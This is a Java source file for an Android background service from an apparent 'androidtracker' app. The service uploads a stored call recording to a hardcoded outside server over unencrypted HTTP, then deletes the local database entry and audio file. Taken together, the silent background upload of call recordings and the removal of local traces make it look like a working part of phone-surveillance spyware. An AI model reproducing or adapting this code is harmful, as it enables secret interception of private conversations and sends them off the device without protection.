package com.alcatrazstudios.apps.androidtracker.services;

import android.app.IntentService;
import android.app.NotificationManager;
import android.content.Intent;
import android.util.Log;

import com.alcatrazstudios.apps.androidtracker.model.CallRecordings;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Calendar;
import java.util.Date;

import io.realm.Realm;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class BackgroundUploadService extends IntentService {
    private NotificationManager nm;
    private final Calendar time = Calendar.getInstance();
    private static final String TAG="UploadIntent";

    private String fName;
    private String lName;
    private String phoneNumber;
    private String selectedFilePath;

//    private Realm realm;
    private CallRecordings callRecordings;


    public BackgroundUploadService() {
        super("");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        // TODO Auto-generated method stub
        fName = intent.getExtras().getString("fname");
        lName = intent.getExtras().getString("lname");
        phoneNumber = intent.getExtras().getString("phone_no");
        selectedFilePath = intent.getExtras().getString("selectedFilePath");
        Realm realm = Realm.getDefaultInstance();
        if (doFileUpload() == 200){
            callRecordings=realm.where(CallRecordings.class).equalTo("fileName",fName).findFirst();
            if (callRecordings != null) {
                File file = new File(callRecordings.getFilePath(), callRecordings.getFileName());
                realm.beginTransaction();
                callRecordings.deleteFromRealm();
                realm.commitTransaction();
                if (file.exists()) {
                    file.delete();
                }
            }
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
//        realm = Realm.getDefaultInstance();

        nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);

/*        Toast.makeText(this, "Service created at " + time.getTime(),
                Toast.LENGTH_LONG).show(); */
        Log.i(TAG,"Service created at " + time.getTime());

    }

    @Override
    public void onDestroy() {
        super.onDestroy();
/*        Toast.makeText(this,
                fName + " Service destroyed at " + time.getTime() + ";",
                Toast.LENGTH_LONG).show(); */
        Log.i(TAG,fName + " Service destroyed at " + time.getTime() + ";");

    }

    public int doFileUpload() {
        int serverResponseCode = 0;
        String upLoadServerUri = "http://oragps.com/recibir/file.php";
        Date d = new Date();
        d.getTime();
        Log.i("FileUpload", "FileUpload: Time : " + d.getTime());
        upLoadServerUri = upLoadServerUri + "?uploadedfile=" + fName.toString();
//        upLoadServerUri = upLoadServerUri + "&fname=" + lName.toString();
//        upLoadServerUri = upLoadServerUri + "&phone_no="
//                + phoneNumber.toString();
        String fileName = selectedFilePath;

        HttpURLConnection conn = null;
        DataOutputStream dos = null;
        FileInputStream fileInputStream = null;
//        DataInputStream inStream = null;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;
        String responseFromServer = "";

        File sourceFile = new File(fileName);

        if (!sourceFile.isFile()) {
            Log.e("FileUpload", "FileUpload:Source File Does not exist");
            return 0;
        }

        try { // open a URL connection to the Servlet

            fileInputStream = new FileInputStream(sourceFile);
            URL url = new URL(upLoadServerUri);
            conn = (HttpURLConnection) url.openConnection(); // Open a HTTP
            // connection to
            // the URL
            conn.setDoInput(true); // Allow Inputs
            conn.setDoOutput(true); // Allow Outputs
            conn.setUseCaches(false); // Don't use a Cached Copy
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type",
                    "multipart/form-data;boundary=" + boundary);
            conn.setRequestProperty("uploadedfile", fileName);

            dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"uploadedfile\";filename=\""
                    + fileName + "\"" + lineEnd);
            dos.writeBytes(lineEnd);

            bytesAvailable = fileInputStream.available(); // create a buffer of
            // maximum size
            Log.i("FileUpload", "FileUpload: Initial .available : "
                    + bytesAvailable);

            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];

            // read file and write it into form...
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);

            while (bytesRead > 0) {
                dos.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            }

            // send multipart form data necesssary after file data...
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

            // Responses from the server (code and message)
            serverResponseCode = conn.getResponseCode();
            String serverResponseMessage = conn.getResponseMessage();
            Log.i("Upload file to server", "HTTP Response is : "
                    + serverResponseMessage + ": " + serverResponseCode);
            // close streams
            Log.i("Upload file to server", fileName + " File is written");
        } catch (MalformedURLException ex) {
            ex.printStackTrace();
            Log.e("Upload file to server", "error: " + ex.getMessage(), ex);
        } catch (Exception e) {
            e.printStackTrace();
            Log.e("Upload file to server", "error: " + e.getMessage(), e);
        } catch (Throwable thrError) {
            thrError.printStackTrace();
            Log.e(TAG,"Failed uploading server: " + thrError.getMessage(),thrError);
        } finally {
            if (dos != null) {
                try{
                    dos.flush();
                    dos.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if (fileInputStream != null) {
                try {
                    fileInputStream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
        // this block will give the response of upload link
        BufferedReader rd = null;
        try {
            rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = rd.readLine()) != null) {
                Log.i("FileUpload", "FileUpload:RES Message: " + line);
            }
        } catch (IOException ioex) {
            Log.e(TAG, "error: " + ioex.getMessage(), ioex);
        } finally {
            if (rd != null){
                try {
                    rd.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        if (serverResponseCode == 200){

        }
        // Function call for notification message..

        return serverResponseCode; // like 200 (Ok)

    } // end upLoad2Server
}
